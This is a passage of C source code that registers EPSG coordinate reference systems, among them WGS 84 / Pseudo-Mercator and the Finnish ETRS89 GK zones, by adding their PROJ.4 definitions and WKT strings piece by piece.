+lat_1=-76.66666666666667 +lat_2=-79.333333333\");\n    add_proj4text (p, 1,\n        \"33333 +lat_0=-90 +lon_0=157 +x_0=500000 +y_0=0 +ellps=GR\");\n    add_proj4text (p, 2,\n        \"S80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"RSRGD2000 / DGLC2000\\\",GEOGCS[\\\"RSRGD2000\\\",DAT\");\n    add_srs_wkt (p, 1,\n        \"UM[\\\"Ross_Sea_Region_Geodetic_Datum_2000\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6764\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4764\\\"]],PROJECTION[\\\"Lambe\");\n    add_srs_wkt (p, 7,\n        \"rt_Conformal_Conic_2SP\\\"],PARAMETER[\\\"standard_parallel_\");\n    add_srs_wkt (p, 8,\n        \"1\\\",-76.66666666666667],PARAMETER[\\\"standard_parallel_2\\\"\");\n    add_srs_wkt (p, 9,\n        \",-79.33333333333333],PARAMETER[\\\"latitude_of_origin\\\",-9\");\n    add_srs_wkt (p, 10,\n        \"0],PARAMETER[\\\"central_meridian\\\",157],PARAMETER[\\\"false\");\n    add_srs_wkt (p, 11,\n        \"_easting\\\",500000],PARAMETER[\\\"false_northing\\\",0],UNIT[\");\n    add_srs_wkt (p, 12,\n        \"\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Northin\");\n    add_srs_wkt (p, 13,\n        \"g\\\",NORTH],AXIS[\\\"Easting\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3\");\n    add_srs_wkt (p, 14,\n        \"852\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3854, \"epsg\", 3854,\n        \"County ST74\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=18.05787 +k=0.99999506 +x_0=\");\n    add_proj4text (p, 1,\n        \"100182.7406 +y_0=-6500620.1207 +ellps=GRS80 +towgs84=0,0\");\n    add_proj4text (p, 2,\n        \",0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"County ST74\\\",GEOGCS[\\\"SWEREF99\\\",DATUM[\\\"SWERE\");\n    add_srs_wkt (p, 1,\n        \"F99\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHOR\");\n    add_srs_wkt (p, 2,\n        \"ITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY\");\n    add_srs_wkt (p, 3,\n        \"[\\\"EPSG\\\",\\\"6619\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 4,\n        \"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUT\");\n    add_srs_wkt (p, 5,\n        \"HORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4619\\\"]]\");\n    add_srs_wkt (p, 6,\n        \",PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitud\");\n    add_srs_wkt (p, 7,\n        \"e_of_origin\\\",0],PARAMETER[\\\"central_meridian\\\",18.05787\");\n    add_srs_wkt (p, 8,\n        \"],PARAMETER[\\\"scale_factor\\\",0.99999506],PARAMETER[\\\"fal\");\n    add_srs_wkt (p, 9,\n        \"se_easting\\\",100182.7406],PARAMETER[\\\"false_northing\\\",-\");\n    add_srs_wkt (p, 10,\n        \"6500620.1207],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\");\n    add_srs_wkt (p, 11,\n        \"\\\"]],AXIS[\\\"x\\\",NORTH],AXIS[\\\"y\\\",EAST],AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 12,\n        \"\\\",\\\"3854\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3857, \"epsg\", 3857,\n        \"WGS 84 / Pseudo-Mercator\");\n    add_proj4text (p, 0,\n        \"+proj=merc +a=6378137 +b=6378137 +lat_ts=0.0 +lon_0=0.0 \");\n    add_proj4text (p, 1,\n        \"+x_0=0.0 +y_0=0 +k=1.0 +units=m +nadgrids=@null +wktext \");\n    add_proj4text (p, 2,\n        \" +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 84 / Pseudo-Mercator\\\",GEOGCS[\\\"WGS 84\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1984\\\",SPHEROID[\\\"WGS 84\\\",6378137,298.2572235\");\n    add_srs_wkt (p, 2,\n        \"63,AUTHORITY[\\\"EPSG\\\",\\\"7030\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"63\");\n    add_srs_wkt (p, 3,\n        \"26\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"\");\n    add_srs_wkt (p, 4,\n        \"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 5,\n        \",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4326\\\"]],PROJECTION[\\\"M\");\n    add_srs_wkt (p, 6,\n        \"ercator_1SP\\\"],PARAMETER[\\\"central_meridian\\\",0],PARAMET\");\n    add_srs_wkt (p, 7,\n        \"ER[\\\"scale_factor\\\",1],PARAMETER[\\\"false_easting\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY\");\n    add_srs_wkt (p, 9,\n        \"[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],\");\n    add_srs_wkt (p, 10,\n        \"EXTENSION[\\\"PROJ4\\\",\\\"+proj=merc +a=6378137 +b=6378137 +\");\n    add_srs_wkt (p, 11,\n        \"lat_ts=0.0 +lon_0=0.0 +x_0=0.0 +y_0=0 +k=1.0 +units=m +n\");\n    add_srs_wkt (p, 12,\n        \"adgrids=@null +wktext  +no_defs\\\"],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 13,\n        \"3857\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3873, \"epsg\", 3873,\n        \"ETRS89 / GK19FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=19 +k=1 +x_0=19500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK19FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",19],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",19500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3873\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3874, \"epsg\", 3874,\n        \"ETRS89 / GK20FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=20 +k=1 +x_0=20500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK20FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",20],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",20500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3874\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3875, \"epsg\", 3875,\n        \"ETRS89 / GK21FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=21 +k=1 +x_0=21500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK21FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",21],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",21500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3875\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3876, \"epsg\", 3876,\n        \"ETRS89 / GK22FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=22 +k=1 +x_0=22500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK22FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",22],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",22500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3876\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3877, \"epsg\", 3877,\n        \"ETRS89 / GK23FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=23 +k=1 +x_0=23500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK23FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",23],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",23500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3877\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3878, \"epsg\", 3878,\n        \"ETRS89 / GK24FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=24 +k=1 +x_0=24500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK24FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",24],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",24500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3878\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3879, \"epsg\", 3879,\n        \"ETRS89 / GK25FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=25 +k=1 +x_0=25500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK25FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",25],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",25500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3879\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3880, \"epsg\", 3880,\n        \"ETRS89 / GK26FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=26 +k=1 +x_0=26500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK26FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",26],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",26500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3880\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3881, \"epsg\", 3881,\n        \"ETRS89 / GK27FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=27 +k=1 +x_0=27500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK27FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",27],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",27500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3881\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3882, \"epsg\", 3882,\n        \"ETRS89 / GK28FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=28 +k=1 +x_0=28500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK28FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",28],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",28500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3882\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3883, \"epsg\", 3883,\n        \"ETRS89 / GK29FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=29 +k=1 +x_0=29500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK29FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        